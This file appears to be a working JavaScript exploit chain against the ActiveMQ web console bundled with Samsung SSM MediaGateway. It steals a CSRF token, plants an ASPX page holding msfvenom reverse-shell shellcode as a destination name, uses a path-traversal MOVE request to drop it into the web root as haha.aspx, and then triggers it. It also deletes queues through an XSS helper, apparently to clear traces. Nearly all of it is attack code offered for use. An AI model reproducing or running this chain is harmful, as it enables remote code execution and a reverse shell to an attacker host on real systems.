function afterloginandsubmit_value()
{
     if (this.readyState == 4) {
     var res = this.responseText.match(/secret" value="(.*)"/g);		// regex grab cotent of secret
     var csrf = res.toString();
     csrf=csrf.split('"');
     var xhr = new XMLHttpRequest();
     var url = "http://127.0.0.1:8161/admin/createDestination.action";
     xhr.open("POST",url,false);
     xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
//root@kali:~/Desktop# msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=192.168.11.186 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
//[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
//[-] No arch selected, selecting arch: x86 from the payload
//Found 1 compatible encoders
//Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
//x86/shikata_ga_nai succeeded with size 351 (iteration=0)
//x86/shikata_ga_nai chosen with final size 351
//Payload size: 351 bytes
//Final size of aspx file: 2862 bytes
//Saved as: shell.aspx
     xhr.send('JMSDestinationType=topic&secret='+csrf[2]+'&JMSDestination=%3C%25%40+Page+Language%3D%22C%23%22+AutoEventWireup%3D%22true%22+%25%3E+%3C%25%40+Import+Namespace%3D%22System.IO%22+%25%3E+%3Cscript+runat%3D%22server%22%3E+++++private+static+Int32+MEM_COMMIT%3D0x1000%3B+++++private+static+IntPtr+PAGE_EXECUTE_READWRITE%3D%28IntPtr%290x40%3B++++++%5BSystem.Runtime.InteropServices.DllImport%28%22kernel32%22%29%5D+++++private+static+extern+IntPtr+VirtualAlloc%28IntPtr+lpStartAddr%2CUIntPtr+size%2CInt32+flAllocationType%2CIntPtr+flProtect%29%3B++++++%5BSystem.Runtime.InteropServices.DllImport%28%22kernel32%22%29%5D+++++private+static+extern+IntPtr+CreateThread%28IntPtr+lpThreadAttributes%2CUIntPtr+dwStackSize%2CIntPtr+lpStartAddress%2CIntPtr+param%2CInt32+dwCreationFlags%2Cref+IntPtr+lpThreadId%29%3B++++++protected+void+Page_Load%28object+sender%2C+EventArgs+e%29+++++%7B+++++++++byte%5B%5D+h5Drg+%3D+new+byte%5B351%5D+%7B+0xda%2C0xd5%2C0xd9%2C0x74%2C0x24%2C0xf4%2C0x5d%2C0xb8%2C0x04%2C0x64%2C0x8f%2C0xe6%2C0x2b%2C0xc9%2C0xb1%2C0x52%2C0x31%2C0x45%2C0x17%2C0x03%2C0x45%2C0x17%2C0x83%2C0xe9%2C0x98%2C+0x6d%2C0x13%2C0x0d%2C0x88%2C0xf0%2C0xdc%2C0xed%2C0x49%2C0x95%2C0x55%2C0x08%2C0x78%2C0x95%2C0x02%2C0x59%2C0x2b%2C0x25%2C0x40%2C0x0f%2C0xc0%2C0xce%2C0x04%2C0xbb%2C0x53%2C0xa2%2C+0x80%2C0xcc%2C0xd4%2C0x09%2C0xf7%2C0xe3%2C0xe5%2C0x22%2C0xcb%2C0x62%2C0x66%2C0x39%2C0x18%2C0x44%2C0x57%2C0xf2%2C0x6d%2C0x85%2C0x90%2C0xef%2C0x9c%2C0xd7%2C0x49%2C0x7b%2C0x32%2C+0xc7%2C0xfe%2C0x31%2C0x8f%2C0x6c%2C0x4c%2C0xd7%2C0x97%2C0x91%2C0x05%2C0xd6%2C0xb6%2C0x04%2C0x1d%2C0x81%2C0x18%2C0xa7%2C0xf2%2C0xb9%2C0x10%2C0xbf%2C0x17%2C0x87%2C0xeb%2C0x34%2C+0xe3%2C0x73%2C0xea%2C0x9c%2C0x3d%2C0x7b%2C0x41%2C0xe1%2C0xf1%2C0x8e%2C0x9b%2C0x26%2C0x35%2C0x71%2C0xee%2C0x5e%2C0x45%2C0x0c%2C0xe9%2C0xa5%2C0x37%2C0xca%2C0x7c%2C0x3d%2C0x9f%2C+0x99%2C0x27%2C0x99%2C0x21%2C0x4d%2C0xb1%2C0x6a%2C0x2d%2C0x3a%2C0xb5%2C0x34%2C0x32%2C0xbd%2C0x1a%2C0x4f%2C0x4e%2C0x36%2C0x9d%2C0x9f%2C0xc6%2C0x0c%2C0xba%2C0x3b%2C0x82%2C0xd7%2C+0xa3%2C0x1a%2C0x6e%2C0xb9%2C0xdc%2C0x7c%2C0xd1%2C0x66%2C0x79%2C0xf7%2C0xfc%2C0x73%2C0xf0%2C0x5a%2C0x69%2C0xb7%2C0x39%2C0x64%2C0x69%2C0xdf%2C0x4a%2C0x17%2C0x5b%2C0x40%2C0xe1%2C+0xbf%2C0xd7%2C0x09%2C0x2f%2C0x38%2C0x17%2C0x20%2C0x97%2C0xd6%2C0xe6%2C0xcb%2C0xe8%2C0xff%2C0x2c%2C0x9f%2C0xb8%2C0x97%2C0x85%2C0xa0%2C0x52%2C0x67%2C0x29%2C0x75%2C0xf4%2C0x37%2C+0x85%2C0x26%2C0xb5%2C0xe7%2C0x65%2C0x97%2C0x5d%2C0xed%2C0x69%2C0xc8%2C0x7e%2C0x0e%2C0xa0%2C0x61%2C0x14%2C0xf5%2C0x23%2C0x4e%2C0x41%2C0xfe%2C0x09%2C0x26%2C0x90%2C0x00%2C0x7f%2C+0xec%2C0x1d%2C0xe6%2C0x15%2C0x02%2C0x48%2C0xb1%2C0x81%2C0xbb%2C0xd1%2C0x49%2C0x33%2C0x43%2C0xcc%2C0x34%2C0x73%2C0xcf%2C0xe3%2C0xc9%2C0x3a%2C0x38%2C0x89%2C0xd9%2C0xab%2C0xc8%2C+0xc4%2C0x83%2C0x7a%2C0xd6%2C0xf2%2C0xab%2C0xe1%2C0x45%2C0x99%2C0x2b%2C0x6f%2C0x76%2C0x36%2C0x7c%2C0x38%2C0x48%2C0x4f%2C0xe8%2C0xd4%2C0xf3%2C0xf9%2C0x0e%2C0x25%2C0x65%2C0xc1%2C+0x8a%2C0xf2%2C0x56%2C0xcc%2C0x13%2C0x76%2C0xe2%2C0xea%2C0x03%2C0x4e%2C0xeb%2C0xb6%2C0x77%2C0x1e%2C0xba%2C0x60%2C0x21%2C0xd8%2C0x14%2C0xc3%2C0x9b%2C0xb2%2C0xcb%2C0x8d%2C0x4b%2C+0x42%2C0x20%2C0x0e%2C0x0d%2C0x4b%2C0x6d%2C0xf8%2C0xf1%2C0xfa%2C0xd8%2C0xbd%2C0x0e%2C0x32%2C0x8d%2C0x49%2C0x77%2C0x2e%2C0x2d%2C0xb5%2C0xa2%2C0xea%2C0x5d%2C0xfc%2C0xee%2C0x5b%2C+0xf6%2C0x59%2C0x7b%2C0xde%2C0x9b%2C0x59%2C0x56%2C0x1d%2C0xa2%2C0xd9%2C0x52%2C0xde%2C0x51%2C0xc1%2C0x17%2C0xdb%2C0x1e%2C0x45%2C0xc4%2C0x91%2C0x0f%2C0x20%2C0xea%2C0x06%2C0x2f%2C+0x61+%7D%3B++++++++++IntPtr+v2N0IrL+%3D+VirtualAlloc%28IntPtr.Zero%2C%28UIntPtr%29h5Drg.Length%2CMEM_COMMIT%2C+PAGE_EXECUTE_READWRITE%29%3B+++++++++System.Runtime.InteropServices.Marshal.Copy%28h5Drg%2C0%2Cv2N0IrL%2Ch5Drg.Length%29%3B+++++++++IntPtr+gXHfNA5YoTy0+%3D+IntPtr.Zero%3B+++++++++IntPtr+dw2Tz3b22+%3D+CreateThread%28IntPtr.Zero%2CUIntPtr.Zero%2Cv2N0IrL%2CIntPtr.Zero%2C0%2Cref+gXHfNA5YoTy0%29%3B+++++%7D+%3C%2Fscript%3E');
		}	
    }

function adminqueuespage(){
var url ="http://127.0.0.1:8161/admin/topics.jsp";
var xhr=new XMLHttpRequest();
xhr.onreadystatechange = afterloginandsubmit_value;
xhr.open("GET",url,true);
xhr.withCredentials = true;
xhr.send();
//DON'T RETURN TRUE IF NO FUNCTION
}

function move(){
var url ="http://127.0.0.1:8161/fileserver/..%5C%5C..%5C%5Cdata%5C%5Ckahadb%5C%5Cdb.data";
var xhr=new XMLHttpRequest();
xhr.open("MOVE",url,true);
xhr.setRequestHeader("Destination","http://127.0.0.1:8161/C://Program Files//Samsung//SSM//MediaGateway//WebViewer//haha.aspx");
xhr.send();
}

function triggershell_upload(){
var url="http://127.0.0.1:4512/haha.aspx"
var xhr=new XMLHttpRequest();
xhr.open("GET",url,true);
xhr.send();
}


function bye_bye_xss(uri){
   var xhr = new XMLHttpRequest();
   xhr.open('GET', uri.replace(/\\+/g,"%2b"), true);
   var b=uri.replace(/\\+/g,"%2b");
alert(b);
   xhr.send();
}


function clear(){
var url="http://127.0.0.1:8161/admin/queues.jsp";
var xhr=new XMLHttpRequest();
xhr.onreadystatechange=function (){
	if (xhr.readyState == 4){
		var result=xhr.responseXML;
		var href= result.getElementsByTagName("a");
		for(i=0; i < href.length ;i++)
			{
				var a=href[i].innerHTML;
				var b=href[i].href;
				if(a == "Delete")
				{
				bye_bye_xss(b);
				}
			}
		}
}
xhr.open("GET",url,true);
xhr.responseType="document";
xhr.send(null);
}


 function sleep(miliseconds) {
                    var currentTime = new Date().getTime();
                    while (currentTime + miliseconds >= new Date().getTime()) {
                    }
                }

function triggerxssagain(){
var url ="http://127.0.0.1:8161/admin/topics.jsp"
var xhr=new XMLHttpRequest();
xhr.open("GET",url,true);
xhr.withCredentials= true;
xhr.send();
return true;
}


adminqueuespage();		// make sure we able to enter the admin/topics page && will do the automation thing
triggerxssagain();
setTimeout(move, 6000); // creates a aspx file with command execution
setTimeout(triggershell_upload,6000)		// will browse the .aspx webpage to trigger the reverse shelladminqueuespage();		// make sure we able to enter the admin/topics page && will do the 
